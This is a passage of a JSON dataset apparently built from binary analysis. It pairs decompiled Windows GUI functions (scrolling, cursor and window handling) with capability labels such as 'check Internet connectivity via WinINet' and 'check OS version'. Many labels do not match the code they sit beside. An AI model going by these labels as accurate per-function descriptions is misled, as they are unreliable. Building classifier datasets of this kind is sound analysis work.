        "decompiled_code": "\nvoid fcn.00441745(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.004413b1(param_1, param_1, param_2);\n        fcn.004416ff(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0044178a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0044178a(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4b9848 == 0) {\n        *0x4b9848 = 1;\n        if (*0x4bb62c == 0) {\n            *0x4bb67c = 3;\n            (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x68, 0, 0x4bb67c, 0);\n        }\n        else {\n            if (*0x4bb684 == 0) {\n                *0x4bb680 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"MSH_SCROLL_LINES_MSG\");\n                if (*0x4bb680 == 0) {\n                    *0x4bb684 = 1;\n                    return *0x4bb67c;\n                }\n                *0x4bb684 = 2;\n            }\n            if (((*0x4bb684 == 2) &&\n                (iVar1 = (*_sym.imp.USER32.dll_FindWindowA)(\"MouseZ\", \"Magellan MSWHEEL\"),  iVar1 != 0)) &&\n               (*0x4bb680 != 0)) {\n                *0x4bb67c = (*_sym.imp.USER32.dll_SendMessageA)(iVar1, *0x4bb680, 0, 0);\n            }\n        }\n    }\n    return *0x4bb67c;\n}\n",
        "token_count": 309
    },
    "004419f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004419f9(uint32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((arg_10h != 0) && (iVar1 = fcn.00418b45(0),  iVar1 != 0)) {\n        return;\n    }\n    iVar1 = (**(*in_ECX + 0x70))(0);\n    if (arg_10h == iVar1) {\n        (**(*in_ECX + 0x138))(arg_8h & 0xff | 0xff00, arg_ch, 1);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00442557": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442557(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t lParam;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint lpRect;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(param_1 + 0x84) == 0) {\n        *(param_1 + 0x84) = 1;\n        var_4h = 1;\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x20));\n        iVar2 = fcn.004185c5(uVar1);\n        if ((iVar2 == 0) ||\n           (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x20), 0x368, 0, &lParam),  iVar2 == 0)) {\n            iVar3 = fcn.00442421(&var_18h, &var_10h);\n            iVar2 = var_14h;\n            iVar4 = var_18h;\n            if (iVar3 == 0) {\n                (*_sym.imp.USER32.dll_GetClientRect)(*(param_1 + 0x20), &lpRect);\n                if ((0 < var_20h) && (0 < var_1ch)) {\n                    fcn.0041726d(3, 0);\n                }\n                *(param_1 + 0x84) = 0;\n                return;\n            }\n        }\n        else {\n            var_4h = 0;\n            fcn.0044199f();\n            iVar2 = var_2ch - var_34h;\n            iVar4 = var_30h - lParam;\n        }\n        fcn.0044249c(iVar4, iVar2, &var_8h, &var_20h, &var_18h, var_4h);\n        if (var_8h != 0) {\n            iVar2 = iVar2 - var_ch;\n        }\n        if (var_4h != 0) {\n            iVar4 = iVar4 - var_10h;\n        }\n        fcn.0044194d(var_18h, var_14h);\n        var_4ch = 0;\n        var_50h = 3;\n        fcn.0041726d(0, var_8h);\n        if (var_8h != 0) {\n            var_48h = *(param_1 + 0x68) + -1;\n            var_44h = iVar4;\n            iVar4 = fcn.004162ae(0, &var_54h, 1);\n            if (iVar4 == 0) {\n                fcn.00417208(0, 0, var_20h, 1);\n            }\n        }\n        fcn.0041726d(1, var_4h);\n        if (var_4h != 0) {\n            var_48h = *(param_1 + 0x6c) + -1;\n            var_44h = iVar2;\n            iVar2 = fcn.004162ae(1, &var_54h, 1);\n            if (iVar2 == 0) {\n                fcn.00417208(1, 0, var_1ch, 1);\n            }\n        }\n        *(param_1 + 0x84) = 0;\n    }\n    return;\n}\n",
        "token_count": 884
    },
    "004428e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004428e6(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetCursorPos)(&var_10h);\n    (*_sym.imp.USER32.dll_GetWindowRect)(param_1[8], &var_28h);\n    iVar1 = param_1[0x1c];\n    uVar6 = 0;\n    if ((iVar1 == 0x7923) || (iVar1 == 0x7922)) {\n        if (var_ch < var_24h) {\n            uVar6 = 30999;\n        }\n        else if (var_1ch < var_ch) {\n            uVar6 = 0x791d;\n        }\n    }\n    if ((iVar1 == 0x7923) || (iVar1 == 0x7921)) {\n        if (var_10h < var_28h) {\n            if (uVar6 == 0) {\n                uVar6 = 0x7919;\n            }\n            else if (iVar1 == 0x7923) {\n                uVar6 = uVar6 - 1;\n            }\n        }\n        else if (var_20h < var_10h) {\n            if (uVar6 == 0) {\n                uVar6 = 0x791b;\n            }\n            else if (iVar1 == 0x7923) {\n                uVar6 = uVar6 + 1;\n            }\n        }\n    }\n    if (param_1[0x1b] == 0) {\n        if (uVar6 == 0) {\n            (*_sym.imp.USER32.dll_SetCursor)(param_1[0x1d]);\n        }\n        else {\n            iVar1 = fcn.0043026e();\n            uVar2 = (*_sym.imp.USER32.dll_LoadCursorA)(*(iVar1 + 0xc), uVar6 & 0xffff);\n            (*_sym.imp.USER32.dll_SetCursor)(uVar2);\n            if ((var_20h < var_10h) || (var_20h = var_28h,  var_10h < var_28h)) {\n                var_8h = var_10h - var_20h;\n            }\n            else {\n                var_8h = 0;\n            }\n            if ((var_1ch < var_ch) || (var_1ch = var_24h,  var_ch < var_24h)) {\n                var_4h = var_ch - var_1ch;\n            }\n            else {\n                var_4h = 0;\n            }\n            piVar3 = fcn.00419bd8();\n            iVar1 = param_1[0x1c];\n            if ((iVar1 == 0x7923) || (iVar1 == 0x7922)) {\n                uVar2 = 1;\n            }\n            else {\n                uVar2 = 0;\n            }\n            if ((iVar1 == 0x7923) || (iVar1 == 0x7921)) {\n                uVar4 = 1;\n            }\n            else {\n                uVar4 = 0;\n            }\n            (**(*piVar3 + 0x184))(&var_18h, var_8h, var_4h, uVar4, uVar2);\n            fcn.0041bf7a(0);\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(piVar3[8]);\n            uVar2 = fcn.004185c5(uVar2);\n            piVar5 = fcn.0042f550(0x495620, uVar2);\n            if (piVar5 == NULL) {\n                (**(*piVar3 + 0x13c))();\n            }\n            else {\n                (**(*piVar5 + 0x17c))(piVar3, var_18h, var_14h, 1);\n            }\n            (*_sym.imp.USER32.dll_UpdateWindow)(param_1[8]);\n            fcn.0041c2a1(0x4bb080, param_1[0x19] + -0x10, param_1[0x1a] + -0x10, 0, 0, 0x51);\n        }\n    }\n    else {\n        (*_sym.imp.USER32.dll_KillTimer)(param_1[8], 0xe000);\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        (*_sym.imp.USER32.dll_SetCursor)(0);\n        iVar1 = fcn.00419bd8();\n        (**(*param_1 + 0x60))();\n        if (*(iVar1 + 0x58) != NULL) {\n            (**(**(iVar1 + 0x58) + 4))(1);\n        }\n        *(iVar1 + 0x58) = 0;\n    }\n    return;\n}\n",
        "token_count": 1191
    },
    "00442c49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00442c49(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x18);\n    *(unaff_EBP + -0x10) = *(extraout_ECX + 0x5c);\n    *(extraout_ECX + 0x5c) = *(unaff_EBP + 8);\n    *(extraout_ECX + 0x60) = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 100) = *(unaff_EBP + 0x10);\n    fcn.0042e293(0);\n    uVar2 = *(extraout_ECX + 0x5c);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042d3b5(uVar2);\n    pcVar5 = _sym.imp.GDI32.dll_LPtoDP;\n    uVar2 = *(unaff_EBP + -0x1c);\n    *(extraout_ECX + 0x68) = *(extraout_ECX + 0x60);\n    *(extraout_ECX + 0x6c) = *(extraout_ECX + 100);\n    (*pcVar5)(uVar2, extraout_ECX + 0x68, 1);\n    iVar3 = (*(unaff_EBP + 0x14))[1];\n    piVar1 = extraout_ECX + 0x70;\n    uVar2 = *(unaff_EBP + -0x1c);\n    *piVar1 = **(unaff_EBP + 0x14);\n    *(extraout_ECX + 0x74) = iVar3;\n    (*pcVar5)(uVar2, piVar1, 1);\n    uVar2 = (*(unaff_EBP + 0x18))[1];\n    uVar4 = *(unaff_EBP + -0x1c);\n    *(extraout_ECX + 0x78) = **(unaff_EBP + 0x18);\n    *(extraout_ECX + 0x7c) = uVar2;\n    (*pcVar5)(uVar4, extraout_ECX + 0x78, 1);\n    if (*(extraout_ECX + 0x6c) < 0) {\n        *(extraout_ECX + 0x6c) = -*(extraout_ECX + 0x6c);\n    }\n    if (*(extraout_ECX + 0x74) < 0) {\n        *(extraout_ECX + 0x74) = -*(extraout_ECX + 0x74);\n    }\n    if (*(extraout_ECX + 0x7c) < 0) {\n        *(extraout_ECX + 0x7c) = -*(extraout_ECX + 0x7c);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042e2e7();\n    if (*piVar1 == 0) {\n        *piVar1 = *(extraout_ECX + 0x68) / 10;\n    }\n    if (*(extraout_ECX + 0x74) == 0) {\n        *(extraout_ECX + 0x74) = *(extraout_ECX + 0x6c) / 10;\n    }\n    if (*(extraout_ECX + 0x78) == 0) {\n        *(extraout_ECX + 0x78) = *piVar1 / 10;\n    }\n    if (*(extraout_ECX + 0x7c) == 0) {\n        *(extraout_ECX + 0x7c) = *(extraout_ECX + 0x74) / 10;\n    }\n    if (*(extraout_ECX + 0x20) != 0) {\n        fcn.00442557();\n        if (*(unaff_EBP + -0x10) != *(extraout_ECX + 0x5c)) {\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(extraout_ECX + 0x20), 0, 1);\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1090
    },
    "00442eae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00442eae(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = param_1 + 0x30;\n    if (*piVar1 == 0) {\n        iVar2 = (**(*param_1 + 0xf0))();\n        *piVar1 = iVar2;\n        fcn.00431ca7();\n    }\n    return *piVar1;\n}\n",
        "token_count": 108
    },
    "00442f43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442f43(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (in_ECX[0x23] != 0) {\n        fcn.0044f017();\n        fcn.0044f3b3(in_ECX[0x23], arg_8h);\n        var_4h = (**(*in_ECX + 0xb4))();\n        while( true ) {\n            iVar2 = fcn.00450dac(&var_4h);\n            if (iVar2 == 0) break;\n            uVar1 = fcn.00451afa(1);\n            fcn.00451fa4(3, uVar1);\n            fcn.00431b26();\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044307c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044307c(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 0xb0) != NULL) {\n        iVar2 = (*_sym.imp.USER32.dll_InSendMessage)();\n        if (iVar2 == 0) {\n            piVar1 = *(param_1 + 0xb0);\n            iVar2 = (**(*piVar1 + 0xc))(piVar1);\n            if (iVar2 != 0) {\n                fcn.00413258(iVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "004430f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004430f3(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_ECX + 0xb0) == NULL) {\n        var_4h = fcn.0044f372(arg_8h);\n    }\n    else {\n        piVar1 = *(in_ECX + 0xb0);\n        var_4h = 0;\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, 3, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 146
    },
    "00443927": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443927(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    fcn.00450dbd();\n    var_4h = (**(*param_1 + 0xb4))();\n    while( true ) {\n        iVar1 = fcn.00450dac(&var_4h);\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + 4);\n    }\n    var_4h = (**(*param_1 + 0xb4))();\n    while( true ) {\n        piVar2 = fcn.00450dac();\n        if (piVar2 == NULL) break;\n        if (piVar2[0xc] != 0) {\n            (**(*piVar2 + 4))(1);\n        }\n    }\n    var_4h = (**(*param_1 + 0xb4))();\n    while( true ) {\n        iVar1 = fcn.00450dac();\n        if (iVar1 == 0) break;\n        fcn.00431cc2();\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "004439be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004439be(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar6 = *(in_ECX + 0xc4);\n    if (iVar6 == 0) {\n        if (arg_8h != NULL) {\n            *arg_8h = 1;\n            arg_8h[1] = 1;\n            *arg_ch = 1;\n            arg_ch[1] = arg_8h[1];\n        }\n        uVar3 = 0;\n    }\n    else {\n        if (arg_10h == NULL) {\n            arg_10h = iVar6 + 0x11c;\n            iVar6 = *(iVar6 + 0x124) - *arg_10h;\n        }\n        else {\n            iVar6 = arg_10h[2] - *arg_10h;\n        }\n        iVar1 = arg_10h[3];\n        iVar2 = arg_10h[1];\n        var_8h = 0;\n        var_4h = 0;\n        piVar4 = fcn.00442eae();\n        (**(*piVar4 + 100))(1, &var_8h);\n        if ((var_8h == 0) || (var_4h == 0)) {\n            (**(*piVar4 + 100))(1, &var_8h);\n        }\n        fcn.00438c5d(&var_8h);\n        if ((var_4h == 0) || (iVar5 = var_8h,  iVar7 = var_4h,  var_8h == 0)) {\n            iVar5 = iVar6;\n            iVar7 = iVar1 - iVar2;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = iVar6;\n            arg_8h[1] = iVar1 - iVar2;\n            *arg_ch = iVar5;\n            arg_ch[1] = iVar7;\n        }\n        uVar3 = fcn.004438c5(iVar5, iVar7);\n    }\n    return uVar3;\n}\n",
        "token_count": 561
    },
    "00444106": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444106(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_8h = *(arg_8h + 0x88);\njoined_r0x0044411c:\n    do {\n        if (arg_8h == 0) {\n            return;\n        }\n        ppiVar1 = fcn.00416670(&arg_8h);\n        arg_8h_00 = *ppiVar1;\n        if (arg_ch == 0) goto code_r0x0044415c;\n    } while ((*(*(in_ECX + 0xc4) + 0x140) != 0) || ((arg_8h_00[0x1f] & 4U) == 0));\n    arg_8h_00[0x1f] = arg_8h_00[0x1f] & 0xfffffffb;\n    iVar2 = arg_ch;\n    goto code_r0x0044417c;\ncode_r0x0044415c:\n    iVar2 = (**(*arg_8h_00 + 0x154))();\n    if ((iVar2 != 0) && (iVar2 = fcn.0041facc(),  iVar2 == 0)) {\n        arg_8h_00[0x1f] = arg_8h_00[0x1f] | 4;\ncode_r0x0044417c:\n        fcn.00420b1d(arg_8h_00, iVar2, 1);\n    }\n    goto joined_r0x0044411c;\n}\n",
        "token_count": 395
    },
    "00444190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444190(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *in_ECX;\n    uint *puVar4;\n    int32_t var_54h;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_ECX;\n    if (arg_8h == 0) goto code_r0x004441b8;\n    iVar1 = fcn.0043303f(arg_8h, 0x10, 0);\n    if (iVar1 != 0) goto code_r0x004441b8;\n    do {\n        do {\n            fcn.00411e42();\ncode_r0x004441b8:\n            piVar3 = arg_ch;\n        } while (arg_ch == NULL);\n        if (arg_8h == 0) {\n            iVar1 = (**(*arg_ch + 0x14))(arg_ch, &var_14h);\n            if (iVar1 != 0) {\n                iVar1 = *piVar3;\n                puVar4 = NULL;\n                goto code_r0x0044431a;\n            }\n        }\n        else {\n            (*_sym.imp.USER32.dll_CopyRect)(&var_14h, arg_8h);\n        }\n        if (arg_10h == 0) {\n            iVar1 = *(in_ECX[0x31] + 0xf8);\n        }\n        else {\n            iVar1 = *(in_ECX[0x31] + 0xf4);\n        }\n        iVar2 = fcn.00426925();\n    } while (iVar2 == 0);\n    if (*(iVar2 + 0x24) == in_ECX[0x31]) {\n        (**(*in_ECX + 0x114))(iVar1, 1);\n    }\n    var_34h = var_14h;\n    var_30h = var_10h;\n    var_2ch = var_ch;\n    var_28h = var_8h;\n    fcn.004189b9(0, 0xffff, 0, 1, &var_34h, &var_14h, 1);\n    var_54h = var_34h - var_14h;\n    iStack84 = var_30h - var_10h;\n    iStack80 = var_ch - var_2ch;\n    iStack76 = var_8h - var_28h;\n    var_24h = var_54h;\n    var_20h = iStack84;\n    var_1ch = iStack80;\n    var_18h = iStack76;\n    iVar2 = fcn.0041fd95();\n    piVar3 = arg_ch;\n    if (((iVar2 == 0) || (*(iVar1 + 0x90) != 0)) && (iVar2 = (**(*arg_ch + 0x18))(arg_ch, &var_54h),  iVar2 == 0)) {\n        (**(*piVar3 + 0x1c))(piVar3, &var_24h);\n        fcn.004189b9(0, 0xffff, 0, 0, 0, &var_14h, 1);\n        arg_ch = *(iVar1 + 0x88);\n        while (arg_ch != NULL) {\n            piVar3 = fcn.00416670(&arg_ch);\n            iVar1 = *piVar3;\n            iVar2 = fcn.0041facc();\n            if (iVar2 == 0) {\n                (*_sym.imp.USER32.dll_UpdateWindow)(*(iVar1 + 0x20));\n            }\n        }\n    }\n    else {\n        (**(*var_4h + 0x114))(iVar1, 0);\n        iVar1 = *piVar3;\n        puVar4 = &var_44h;\n        var_44h = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_38h = 0;\ncode_r0x0044431a:\n        (**(iVar1 + 0x1c))(piVar3, puVar4);\n    }\n    return;\n}\n",
        "token_count": 1104
    },
    "00445ad4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00445ad4(void)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    if (extraout_ECX[0x2c] == 0) {\n        (**(*extraout_ECX + 0x90))();\n    }\n    else {\n        (**(*extraout_ECX + 0xc4))();\n        iVar1 = (**(*extraout_ECX + 0x58))();\n        if (iVar1 != 0) {\n            fcn.0042407a();\n            fcn.0040f840();\n            *(unaff_EBP + -4) = 0;\n            fcn.00431fc9();\n            iVar1 = fcn.00426240(*(unaff_EBP + -0x10), 3, 0xf187);\n            if (iVar1 == 2) {\n                fcn.00402740();\n            }\n            else {\n                if (iVar1 == 6) {\n                    (**(*extraout_ECX + 0xec))();\n                }\n                fcn.00402740();\n            }\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 285
    },
    "00445d54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: lprcSrc\n// WARNING: Variable defined which should be unmapped: lprc\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00445d54(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *arg_8h;\n    int32_t iVar6;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint lprc;\n    uint lprcSrc;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af();\n    if (extraout_ECX[0x2c] == NULL) goto code_r0x0044618c;\n    if (extraout_ECX[0x31] != 0) {\n        if (*(extraout_ECX[0x31] + 0xd4) != 0) {\n            (**(*extraout_ECX[0x2c] + 0x18))();\n            goto code_r0x0044618c;\n        }\n        (**(*extraout_ECX + 0x108))();\n    }\n    iVar3 = fcn.00450f19();\n    if (iVar3 == 0) {\n        fcn.0046230a(&stack0xfffffff4, 0x4a76e8);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)();\n    if (iVar3 != 0) goto code_r0x0044618c;\n    fcn.0042407a();\n    fcn.0040f840();\n    *(unaff_EBP + -4) = 0;\n    fcn.0042407a();\n    fcn.0040f840();\n    *(unaff_EBP + -4) = 1;\n    uVar4 = fcn.0042407a();\n    fcn.004136d8(uVar4);\n    iVar3 = *extraout_ECX;\n    *(unaff_EBP + -4) = 2;\n    iVar3 = (**(iVar3 + 0x130))(unaff_EBP + -0x1c);\n    if (iVar3 != 0) {\n        uVar4 = *(unaff_EBP + -0x1c);\n        iVar3 = fcn.0043026e();\n        fcn.00431fe0(unaff_EBP + -0x18, 0xe005, *(iVar3 + 0x10), uVar4);\n        piVar5 = fcn.00431b02(extraout_ECX[0x2c], 0x49fa28);\n        if (piVar5 != NULL) {\n            iVar3 = (**(*piVar5 + 0x14))(piVar5);\n            if ((iVar3 == 0) && (iVar3 = (**(*piVar5 + 0x18))(piVar5),  iVar3 == 0)) {\n                (**(*piVar5 + 0xc))(piVar5, unaff_EBP + -0x14);\n                uVar4 = fcn.004185c5(*(unaff_EBP + -0x14));\n                arg_8h = (**(*extraout_ECX + 0x124))(uVar4);\n                if (arg_8h != NULL) {\n                    extraout_ECX[0x31] = arg_8h;\n                    iVar3 = (**(*piVar5 + 0x1c))(piVar5);\n                    if (iVar3 == 0) {\n                        iVar3 = (**(*piVar5 + 0x20))\n                                          (piVar5, arg_8h + 0x3b, arg_8h + 0x3c, unaff_EBP + -0x44, unaff_EBP + -0x34, \n                                           arg_8h + 0x36);\n                        if ((iVar3 == 0) && (iVar3 = (**(*arg_8h + 0x184))(),  iVar3 != 0)) {\n                            (**(*arg_8h[0x3b] + 0xc))(arg_8h[0x3b], unaff_EBP + -0x14);\n                            uVar4 = fcn.0044323d(*(unaff_EBP + -0x14));\n                            *(unaff_EBP + -0x14) = uVar4;\n                            iVar3 = fcn.00411579(0xd8);\n                            *(unaff_EBP + -0x20) = iVar3;\n                            *(unaff_EBP + -4) = 3;\n                            if (iVar3 == 0) {\n                                iVar3 = 0;\n                            }\n                            else {\n                                iVar3 = fcn.004462e7(arg_8h);\n                            }\n                            arg_8h[0x3d] = iVar3;\n                            *(unaff_EBP + -4) = 2;\n                            fcn.00418606(*(unaff_EBP + -0x14));\n                            piVar1 = arg_8h[0x3c];\n                            if (piVar1 != NULL) {\n                                (**(*piVar1 + 0xc))(piVar1, unaff_EBP + -0x20);\n                                if (*(unaff_EBP + -0x20) == *(unaff_EBP + -0x14)) {\n                                    fcn.00431b26(arg_8h + 0x3c);\n                                    arg_8h[0x3c] = 0;\n                                }\n                                else {\n                                    iVar3 = fcn.00411579(0xd8);\n                                    *(unaff_EBP + -0x24) = iVar3;\n                                    *(unaff_EBP + -4) = 4;\n                                    if (iVar3 == 0) {\n                                        iVar3 = 0;\n                                    }\n                                    else {\n                                        